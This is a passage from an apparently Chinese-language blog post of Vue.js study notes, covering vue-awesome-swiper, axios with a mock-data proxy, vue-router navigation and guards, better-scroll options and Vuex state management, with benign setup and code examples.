title="优点"></a>优点</h3><ul><li>可以使用缩进实现样式嵌套</li><li>可以使用变量</li><li>可以使用混合</li></ul><h2 id="vue-awesome-swiper-依赖包"><a href="#vue-awesome-swiper-依赖包" class="headerlink" title="vue-awesome-swiper 依赖包 "></a>vue-awesome-swiper 依赖包 </h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vue-awesome-swiper@2.6.7 --save</span><br></pre></td></tr></table></figure><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//main.js</span><br><span class="line">import VueAwesomeSwiper from &apos;vue-awesome-swiper&apos;</span><br><span class="line">import &apos;swiper/dist/css/swiper.css&apos;</span><br><span class="line"></span><br><span class="line">Vue.use(VueAwesomeSwiper)</span><br></pre></td></tr></table></figure><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><table><thead><tr><th style="text-align:left">Parameter</th><th style="text-align:left">Type</th><th style="text-align:left">Default</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">direction</td><td style="text-align:left">string</td><td style="text-align:left">‘horizontal’</td><td style="text-align:left">Could be ‘horizontal’ or ‘vertical’ (for vertical slider)</td></tr><tr><td style="text-align:left">speed</td><td style="text-align:left">number</td><td style="text-align:left">300</td><td style="text-align:left">Duration of transition between slides (in ms)</td></tr><tr><td style="text-align:left">loop</td><td style="text-align:left">boolean</td><td style="text-align:left">false</td><td style="text-align:left">Set to true to enable continuous loop mode</td></tr></tbody></table><h3 id="常用组件"><a href="#常用组件" class="headerlink" title="常用组件"></a>常用组件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pagination: &#123;</span><br><span class="line">  el: &apos;.swiper-pagination&apos;,</span><br><span class="line">  type: &apos;bullets&apos; </span><br><span class="line">  //Can be &quot;bullets&quot;, &quot;fraction&quot;, &quot;progressbar&quot; or &quot;custom&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><ul><li>当 swiper 包裹的元素为图片时，为了防止图片加载较慢导致的回流 (reflow) 现象，建议在 swiper 外加一层 div ，并提前为其设置宽高。</li><li>为了防止渲染的顺序与请求返回的数组顺序不一致，可以添加 <code>v-if</code> 条件，设置请求获得返回值时再进行页面渲染。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;wrapper&quot;&gt;</span><br><span class="line">  &lt;swiper :options=&quot;swiperOption&quot; v-if=&quot;showSwiper&quot;&gt;</span><br><span class="line">    &lt;!-- slides --&gt;</span><br><span class="line">    &lt;swiper-slide v-for=&quot;item of list&quot; :key=&quot;item.id&quot;&gt;</span><br><span class="line">        &lt;img class=&quot;swiper-img&quot; :src=&quot;item.imgUrl&quot; /&gt;</span><br><span class="line">    &lt;/swiper-slide&gt;</span><br><span class="line">    &lt;!-- Optional controls --&gt;</span><br><span class="line">    &lt;div class=&quot;swiper-pagination&quot;  slot=&quot;pagination&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/swiper&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">.wrapper</span><br><span class="line">  width: 100%</span><br><span class="line">  height: 0</span><br><span class="line">  overflow: hidden</span><br><span class="line">  padding-bottom: 26.5%</span><br></pre></td></tr></table></figure><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>当 <code>swpier</code> 包裹元素几期父元素存在隐藏后显示情况时，会导致 swiper 计算出错，为了解决这一问题可以在 <code>swiperOptions</code> 里添加两个属性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">swiperOption: &#123;</span><br><span class="line">  pagination: &apos;.swiper-pagination&apos;,</span><br><span class="line">  paginationType: &apos;fraction&apos;,</span><br><span class="line">  observeParents: true,</span><br><span class="line">  observer: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>只要监听到该元素或其父元素DOM发生了变化，就会刷新页面，重新计算。</p><h2 id="Axios-获取数据"><a href="#Axios-获取数据" class="headerlink" title="Axios 获取数据"></a>Axios 获取数据</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install axios --save</span><br></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import axios from &apos;axios&apos;</span><br><span class="line"></span><br><span class="line">data () &#123;</span><br><span class="line">  return &#123;</span><br><span class="line">    lastCity: &apos;&apos;,</span><br><span class="line">    swiperList: [],</span><br><span class="line">    iconList: [],</span><br><span class="line">    recommendList: [],</span><br><span class="line">    weekendList: []</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line">    getHomeInfo () &#123;</span><br><span class="line">      axios.get(&apos;/api/index.json&apos;).then(this.getHomeInfoSucc)</span><br><span class="line">    &#125;,</span><br><span class="line">    getHomeInfoSucc (res) &#123;</span><br><span class="line">      res = res.data</span><br><span class="line">      if (res.ret &amp;&amp; res.data) &#123;</span><br><span class="line">        const data = res.data</span><br><span class="line">        this.swiperList = data.swiperList</span><br><span class="line">        this.iconList = data.iconList</span><br><span class="line">        this.recommendList = data.recommendList</span><br><span class="line">        this.weekendList = data.weekendList</span><br><span class="line">      &#125;</span><br><span class="line">      console.log(res)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted () &#123;</span><br><span class="line">    this.getHomeInfo()</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在开发环境，可以模拟从后端返回的json数据，在 <code>static/mock/</code> 目录下放模拟的 JSON 文件。并在 <code>config/index.js -&gt; ProxyTable</code> 中配置映射路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">proxyTable: &#123;</span><br><span class="line">  &apos;/api&apos;: &#123;</span><br><span class="line">    target: &apos;http://localhost:8080&apos;,</span><br><span class="line">    pathRewrite: &#123;</span><br><span class="line">      &apos;^/api&apos;: &apos;/static/mock&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="vue-router"><a href="#vue-router" class="headerlink" title="vue-router"></a>vue-router</h2><h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>单页面复应用 (SPA) 的核心就是前端路由。路由切换时，切换的是 <code>&lt;router-view&gt;</code> 挂载的组件，其他内容不会变化。</p><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install vue-router --save</span><br><span class="line"></span><br><span class="line">import VueRouter from &apos;vue-router&apos;</span><br><span class="line">Vue.use(VueRouter)</span><br></pre></td></tr></table></figure><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link to=&quot;/&quot;&gt;Go to Home&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">routes: [</span><br><span class="line">  &#123;</span><br><span class="line">    path: &apos;/&apos;,</span><br><span class="line">    name: &apos;Hello&apos;,</span><br><span class="line">    component: Hello</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="动态路由匹配"><a href="#动态路由匹配" class="headerlink" title="动态路由匹配"></a>动态路由匹配</h3><p>我们经常需要把某种模式匹配到的所有路由，全都映射到同个组件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">routes: [</span><br><span class="line">  &#123;</span><br><span class="line">    path: &apos;/detail/:id&apos;,</span><br><span class="line">    name: &apos;Detail&apos;,</span><br><span class="line">    component: Detail</span><br><span class="line">  &#125;</span><br><span class="line">],</span><br></pre></td></tr></table></figure></p><p>一个“路径参数”使用冒号 <code>:</code> 标记。当匹配到一个路由时，参数值会被设置到 <code>this.$route.params</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">params: &#123;</span><br><span class="line">  id: this.$route.params.id</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当使用路由参数时，例如从 <code>/user/foo</code> 导航到 <code>/user/bar</code>，原来的组件实例会被复用，这意味着组件的生命周期钩子不会再被调用。</p><p>复用组件时，想对路由参数的变化作出响应的话，你可以简单地 watch (监测变化) $route 对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const User = &#123;</span><br><span class="line">  template: &apos;...&apos;,</span><br><span class="line">  watch: &#123;</span><br><span class="line">    &apos;$route&apos; (to, from) &#123;</span><br><span class="line">      // 对路由变化作出响应...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>有时候，同一个路径可以匹配多个路由，此时，匹配的优先级就按照路由的定义顺序：谁先定义的，谁的优先级就最高。</p><h3 id="编程式的导航"><a href="#编程式的导航" class="headerlink" title="编程式的导航"></a>编程式的导航</h3><p>除了使用 <code>&lt;router-link&gt;</code> 创建 a 标签来定义导航链接，我们还可以借助 router 的实例方法，通过编写代码来实现。</p><ul><li>router.push(location, onComplete?, onAbort?)</li><li>router.replace(location, onComplete?, onAbort?)</li><li>router.go(n)</li></ul><h3 id="导航守卫"><a href="#导航守卫" class="headerlink" title="导航守卫"></a>导航守卫</h3><p>导航守卫主要用来通过跳转或取消的方式守卫导航。有多种机会植入路由导航过程中：全局的, 单个路由独享的, 或者组件级的。</p><h4 id="全局前置守卫"><a href="#全局前置守卫" class="headerlink" title="全局前置守卫"></a>全局前置守卫</h4><p>当一个导航触发时，全局前置守卫按照创建顺序调用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//main.js</span><br><span class="line">router.beforeEach((to, from, next) =&gt; &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>每个守卫方法接收三个参数：</p><ul><li>to: Route: 即将要进入的目标 路由对象</li><li>from: Route: 当前导航正要离开的路由</li><li>next: Function: 一定要调用该方法来 resolve 这个钩子。</li></ul><h4 id="全局后置钩子"><a href="#全局后置钩子" class="headerlink" title="全局后置钩子"></a>全局后置钩子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">router.afterEach((to, from) =&gt; &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="路由独享的守卫"><a href="#路由独享的守卫" class="headerlink" title="路由独享的守卫"></a>路由独享的守卫</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const router = new VueRouter(&#123;</span><br><span class="line">  routes: [</span><br><span class="line">    &#123;</span><br><span class="line">      path: &apos;/foo&apos;,</span><br><span class="line">      component: Foo,</span><br><span class="line">      beforeEnter: (to, from, next) =&gt; &#123;</span><br><span class="line">        // ...</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="组件内的守卫"><a href="#组件内的守卫" class="headerlink" title="组件内的守卫"></a>组件内的守卫</h4><ul><li>beforeRouteEnter</li><li>beforeRouteUpdate (2.2 新增)</li><li>beforeRouteLeave </li></ul><h4 id="完整的导航解析流程"><a href="#完整的导航解析流程" class="headerlink" title="完整的导航解析流程"></a>完整的导航解析流程</h4><ul><li>导航被触发。</li><li>在失活的组件里调用 beforeRouteLeave 离开守卫。</li><li>调用全局的 beforeEach 守卫。</li><li>在重用的组件里调用 beforeRouteUpdate 守卫 (2.2+)。</li><li>在路由配置里调用 beforeEnter。</li><li>解析异步路由组件。</li><li>在被激活的组件里调用 beforeRouteEnter。</li><li>调用全局的 beforeResolve 守卫 (2.5+)。</li><li>导航被确认。</li><li>调用全局的 afterEach 钩子。</li><li>触发 DOM 更新。</li><li>用创建好的实例调用 beforeRouteEnter 守卫中传给 next 的回调函数。</li></ul><h3 id="滚动行为"><a href="#滚动行为" class="headerlink" title="滚动行为"></a>滚动行为</h3><p>使用前端路由，当切换到新路由时，想要页面滚到顶部，或者是保持原先的滚动位置，就像重新加载页面那样。 vue-router 能做到，而且更好，它让你可以自定义路由切换时页面如何滚动。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scrollBehavior (to, from, savedPosition) &#123;</span><br><span class="line">  if (savedPosition) &#123;</span><br><span class="line">    return savedPosition</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return &#123; x: 0, y: 0 &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="better-scroll-依赖包"><a href="#better-scroll-依赖包" class="headerlink" title="better-scroll 依赖包"></a>better-scroll 依赖包</h2><h3 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">npm install better-scroll --save</span><br><span class="line"></span><br><span class="line">import BScroll from &apos;better-scroll&apos;</span><br><span class="line">mounted () &#123;</span><br><span class="line">  this.scroll = new Bscroll(this.$refs.wrapper, &#123; mouseWheel: true, click: true, tap: true &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="常用参数-1"><a href="#常用参数-1" class="headerlink" title="常用参数"></a>常用参数</h3><ul><li>startX: 0 (默认值:0) 表示X轴滚动的起始值</li><li>startY: 0 (默认值:0) 表示Y轴滚动的起始值</li><li>scrollY: false (默认值:false) 表示延Y轴滚动</li><li>scrollX: true (默认值:true) 表示延X轴滚动</li><li>freeScroll: false (默认值:false) 自由方向滚动</li><li>scrollbar: false (默认值:false) 滚动条</li><li>click: false (默认值:false) better-scroll 默认会阻止浏览器的原生 click 事件。当设置为 true，better-scroll 会派发一个 click 事件</li><li>tap: false (默认值:false) better-scroll 会阻止原生的 click 事件，我们可以设置 tap 为 true，它会在区域被点击的时候派发一个 tap 事件</li><li>mouseWheel: false (默认值:false) 这个配置用于 PC 端的鼠标滚轮，默认为 false 。当设置为 true 或者是一个 Object 的时候，可以开启鼠标滚轮</li></ul><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><h4 id="refresh"><a href="#refresh" class="headerlink" title="refresh()"></a>refresh()</h4><p>重新计算 better-scroll，当 DOM 结构发生变化的时候务必要调用确保滚动的效果正常</p><h4 id="scrollTo-x-y-time-easing"><a href="#scrollTo-x-y-time-easing" class="headerlink" title="scrollTo(x, y, time, easing)"></a>scrollTo(x, y, time, easing)</h4><p>滚动到指定的位置;</p><ul><li>x: X轴位置;</li><li>y: Y轴位置;</li><li>time: 到达指定位置所需时间，单位ms; </li><li>easing: 动画函数(一般不建议修改)</li></ul><h4 id="scrollBy-x-y-time-easing"><a href="#scrollBy-x-y-time-easing" class="headerlink" title="scrollBy(x, y, time, easing)"></a>scrollBy(x, y, time, easing)</h4><p>相对于当前位置偏移滚动 x,y 的距离；</p><ul><li>x: 当前位置偏移X轴的距离</li><li>y: 当前位置偏移Y轴的距离</li><li>time: 到达偏移位置所需时间，单位ms; </li><li>easing: 动画函数(一般不建议修改)</li></ul><h4 id="scrollToElement-el-time-offsetX-offsetY-easing"><a href="#scrollToElement-el-time-offsetX-offsetY-easing" class="headerlink" title="scrollToElement(el, time, offsetX, offsetY, easing)"></a>scrollToElement(el, time, offsetX, offsetY, easing)</h4><p>滚动到指定的目标元素</p><ul><li>el: 目标元素;</li><li>time: 到达目标元素所需时间，单位ms; </li><li>offsetX: 距离目标元素所偏移X轴的距离;设置为true时，到达目标元素中心位置</li><li>offsetY: 距离目标元素所偏移Y轴的距离;设置为true时，到达目标元素中心位置</li><li>easing: 动画函数(一般不建议修改)</li></ul><h2 id="vuex-实现数据共享"><a href="#vuex-实现数据共享" class="headerlink" title="vuex 实现数据共享"></a>vuex 实现数据共享</h2><h3 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install vuex --save</span><br><span class="line"></span><br><span class="line">//main.js</span><br><span class="line">import Vuex from &apos;vuex&apos;</span><br><span class="line">Vue.use(Vuex)</span><br></pre></td></tr></table></figure><h3 id="解释-1"><a href="#解释-1" class="headerlink" title="解释"></a>解释</h3><p>Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。<br>Vuex 解决了以下问题：</p><ul><li>多个视图依赖于同一状态。</li><li>来自不同视图的行为需要变更同一状态。</li></ul><p>下图为 vuex 工作流程:</p><p><img src="../assets/20190916/vuex.png" alt="Alt text"></p><h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><p>每一个 Vuex 应用的核心就是 store（仓库）。“store”基本上就是一个容器，它包含着你的应用中大部分的状态 (state)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">const store = new Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    count: 0</span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    increment (state) &#123;</span><br><span class="line">      state.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h3><h4 id="State"><a href="#State" class="headerlink" title="State"></a>State</h4><p>由于 Vuex 的状态存储是响应式的，从 store 实例中读取状态最简单的方法就是在计算属性中返回某个状态。每当 <code>this.$store.state.count</code> 变化的时候, 都会重新求取计算属性，并且触发更新相关联的 DOM。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const Counter = &#123;</span><br><span class="line">  template: `&lt;div&gt;&#123;&#123; count &#125;&#125;&lt;/div&gt;`,</span><br><span class="line">  computed: &#123;</span><br><span class="line">    count () &#123;</span><br><span class="line">      return this.$store.state.count</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以使用 <code>mapState</code> 辅助函数帮助我们生成计算属性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import &#123; mapState &#125; from &apos;vuex&apos;</span><br><span class="line"></span><br><span class="line">computed: &#123;</span><br><span class="line">  ...mapState([&apos;city&apos;])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Getter"><a href="#Getter" class="headerlink" title="Getter"></a>Getter</h4><p>Vuex 允许我们在 store 中定义“getter”（可以认为是 store 的计算属性）。就像计算属性一样，getter 的返回值会根据它的依赖被缓存起来，且只有当它的依赖值发生了改变才会被重新计算。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">const store = new Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    todos: [</span><br><span class="line">      &#123; id: 1, text: &apos;...&apos;, done: true &#125;,</span><br><span class="line">      &#123; id: 2, text: &apos;...&apos;, done: false &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  getters: &#123;</span><br><span class="line">    doneTodos: state =&gt; &#123;</span><br><span class="line">      return state.todos.filter(todo =&gt; todo.done)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">store.getters.doneTodos </span><br><span class="line">// -&gt; [&#123; id: 1, text: &apos;...&apos;, done: true &#125;]</span><br></pre></td></tr></table></figure></p><p><code>mapGetters</code> 辅助函数仅仅是将 store 中的 getter 映射到局部计算属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import &#123; mapGetters &#125; from &apos;vuex&apos;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  computed: &#123;</span><br><span class="line">    ...mapGetters([</span><br><span class="line">      &apos;doneTodosCount&apos;,</span><br><span class="line">      &apos;anotherGetter&apos;,</span><br><span class="line">    ])</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="Mutation"><a href="#Mutation" class="headerlink" title="Mutation"></a>Mutation</h4><p>更改 Vuex 的 store 中的状态的唯一方法是提交 mutation。Vuex 中的 mutation 非常类似于事件：每个 mutation 都有一个字符串的 <code>事件类型</code> (type) 和 一个 <code>回调函数</code> (handler)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mutations: &#123;</span><br><span class="line">  increment (state, payload) &#123;</span><br><span class="line">    state.count += payload.amount</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">store.commit(&apos;increment&apos;, &#123;</span><br><span class="line">  amount: 10</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>你可以在组件中使用 this.$store.commit(‘xxx’) 提交 mutation，或者使用 <code>mapMutations</code> 辅助函数将组件中的 methods 映射为 store.commit 调用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import &#123; mapMutations &#125; from &apos;vuex&apos;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  // ...</span><br><span class="line">  methods: &#123;</span><br><span class="line">    ...mapMutations([</span><br><span class="line">      &apos;increment&apos;, </span><br><span class="line">      // 将 `this.increment()` 映射为 `this.$store.commit(&apos;increment&apos;)`</span><br><span class="line">    ])</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><h4 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h4><p>Action 类似于 mutation，不同在于：</p><ul><li>Action 提交的是 mutation，而不是直接变更状态。</li><li>Action 可以包含任意异步操作。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">const store = new Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    count: 0</span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    increment (state) &#123;</span><br><span class="line">      state.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  actions: &#123;</span><br><span class="line">    increment (context) &#123;</span><br><span class="line">      context.commit(&apos;increment&apos;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">store.dispatch(&apos;increment&apos;)</span><br></pre></td></tr></table></figure><p>我们可以在 action 内部执行异步操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">actions: &#123;</span><br><span class="line">  actionA (&#123; commit &#125;) &#123;</span><br><span class="line">    return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">      setTimeout(() =&gt; &#123;</span><br><span class="line">        commit(&apos;someMutation&apos;)</span><br><span class="line">        resolve()</span><br><span class="line">      &#125;, 1000)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">store.dispatch(&apos;actionA&apos;).then(() =&gt; &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h4 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h4><p>Vuex 允许我们将 store 分割成模块（module）。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 